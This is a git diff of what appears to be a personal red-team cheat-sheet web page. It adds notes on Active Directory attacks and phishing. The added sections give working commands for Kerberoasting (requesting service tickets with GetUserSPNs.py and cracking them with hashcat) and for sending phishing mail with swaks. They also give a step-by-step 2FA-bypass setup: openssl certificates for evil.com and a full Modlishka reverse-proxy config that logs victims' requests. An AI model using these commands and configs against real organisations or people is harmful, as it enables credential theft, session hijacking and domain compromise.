@@ -470,6 +470,20 @@
 
             
           
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Posts/osint_into_da/" class="md-nav__link">
+        From OSINT Into Domain Admin
+      </a>
+    </li>
+  
+
+            
+          
         </ul>
       </nav>
     </li>
@@ -999,7 +1013,15 @@ powershell -ep bypass
 invoke-bloodhound -CollectionMethod all 
 </code></pre></div></p>
 <h1 id="enumeration">Enumeration<a class="headerlink" href="#enumeration" title="Permanent link">&para;</a></h1>
+<h2 id="null-session">Null Session<a class="headerlink" href="#null-session" title="Permanent link">&para;</a></h2>
 <h1 id="initial-access">Initial Access<a class="headerlink" href="#initial-access" title="Permanent link">&para;</a></h1>
+<h2 id="kerberoasting">Kerberoasting<a class="headerlink" href="#kerberoasting" title="Permanent link">&para;</a></h2>
+<h3 id="spn-service-account">SPN Service Account<a class="headerlink" href="#spn-service-account" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="c1"># Get all SPN accounts</span>
+GetUserSPNs.py domain/user:<span class="s1">&#39;password&#39;</span> -request
+<span class="c1"># Crack the ticket</span>
+hashcat -a <span class="m">0</span> -m <span class="m">13100</span> <span class="nb">hash</span>
+</code></pre></div>
 <h1 id="privilege-escalation">Privilege Escalation<a class="headerlink" href="#privilege-escalation" title="Permanent link">&para;</a></h1>
 <h1 id="lateral-movement">Lateral Movement<a class="headerlink" href="#lateral-movement" title="Permanent link">&para;</a></h1>
 <h1 id="defense-evasion">Defense Evasion<a class="headerlink" href="#defense-evasion" title="Permanent link">&para;</a></h1>
@@ -1062,6 +1084,48 @@ invoke-bloodhound -CollectionMethod all
 </code></pre></div>
 </li>
 </ul>
+<h1 id="red-team">Red Team<a class="headerlink" href="#red-team" title="Permanent link">&para;</a></h1>
+<h2 id="phishing">Phishing<a class="headerlink" href="#phishing" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="c1"># Sending mails through Linux </span>
+swaks -to <span class="s2">&quot;</span><span class="nv">$mail</span><span class="s2">&quot;</span> -from <span class="s2">&quot;user@security.com&quot;</span> -body <span class="s2">&quot;example&quot;</span> -header <span class="s2">&quot;Subject: example&quot;</span> -server ip
+</code></pre></div>
+<h2 id="bypass-2fa">Bypass 2FA<a class="headerlink" href="#bypass-2fa" title="Permanent link">&para;</a></h2>
+<p>Modliska revere http proxy for phishing
+<a href="https://github.com/drk1wi/Modlishka/wiki/How-to-use">Link</a><br>
+Add <code>A</code> record with content <code>your domain</code><br>
+Generate SSL Certificate<br>
+<div class="highlight"><pre><span></span><code>openssl genrsa -out evil.com.key <span class="m">4096</span>
+openssl req -new -key evil.com.key -out evil.com.csr -utf8 -batch -subj <span class="err">&#39;</span>/CN<span class="o">=</span>evil.com/
+</code></pre></div>
+Download modlishka and create a config file, import a key, pem file using <code>awk '{printf "%s\\n", $0}' ../evil.key</code><br>
+<div class="highlight"><pre><span></span><code><span class="p">{</span>
+  <span class="nt">&quot;proxyDomain&quot;</span><span class="p">:</span> <span class="s2">&quot;evil.com&quot;</span><span class="p">,</span>
+  <span class="nt">&quot;listeningAddress&quot;</span><span class="p">:</span> <span class="s2">&quot;ip&quot;</span><span class="p">,</span>
+
+  <span class="nt">&quot;target&quot;</span><span class="p">:</span> <span class="s2">&quot;a.evil.com&quot;</span><span class="p">,</span>
+  <span class="nt">&quot;targetResources&quot;</span><span class="p">:</span> <span class="s2">&quot;&quot;</span><span class="p">,</span>
+  <span class="nt">&quot;targetRules&quot;</span><span class="p">:</span> <span class="s2">&quot;&quot;</span><span class="p">,</span>
+  <span class="nt">&quot;terminateTriggers&quot;</span><span class="p">:</span> <span class="s2">&quot;&quot;</span><span class="p">,</span>
+  <span class="nt">&quot;terminateRedirectUrl&quot;</span><span class="p">:</span> <span class="s2">&quot;&quot;</span><span class="p">,</span>
+  <span class="nt">&quot;trackingCookie&quot;</span><span class="p">:</span> <span class="s2">&quot;id&quot;</span><span class="p">,</span>
+  <span class="nt">&quot;trackingParam&quot;</span><span class="p">:</span> <span class="s2">&quot;id&quot;</span><span class="p">,</span>
+  <span class="nt">&quot;jsRules&quot;</span><span class="p">:</span><span class="s2">&quot;&quot;</span><span class="p">,</span>
+  <span class="nt">&quot;forceHTTPS&quot;</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+  <span class="nt">&quot;forceHTTP&quot;</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+  <span class="nt">&quot;dynamicMode&quot;</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+  <span class="nt">&quot;debug&quot;</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
+  <span class="nt">&quot;logPostOnly&quot;</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+  <span class="nt">&quot;disableSecurity&quot;</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
+  <span class="nt">&quot;log&quot;</span><span class="p">:</span> <span class="s2">&quot;requests.log&quot;</span><span class="p">,</span>
+  <span class="nt">&quot;plugins&quot;</span><span class="p">:</span> <span class="s2">&quot;all&quot;</span><span class="p">,</span>
+  <span class="nt">&quot;cert&quot;</span><span class="p">:</span> <span class="s2">&quot;-----BEGIN CERTIFICATE-----\n&lt;snip&gt;\n-----END CERTIFICATE-----\n&quot;</span><span class="p">,</span>
+  <span class="nt">&quot;certKey&quot;</span><span class="p">:</span> <span class="s2">&quot;-----BEGIN RSA PRIVATE\n&lt;snip-----END RSA PRIVATE KEY-----\n&quot;</span><span class="p">,</span>
+  <span class="nt">&quot;certPool&quot;</span><span class="p">:</span> <span class="s2">&quot;&quot;</span>
+<span class="p">}</span>
+</code></pre></div>
+Run modlishka<br>
+<div class="highlight"><pre><span></span><code>./Modlishka -config modlishka.json
+</code></pre></div></p>
                 
               
               
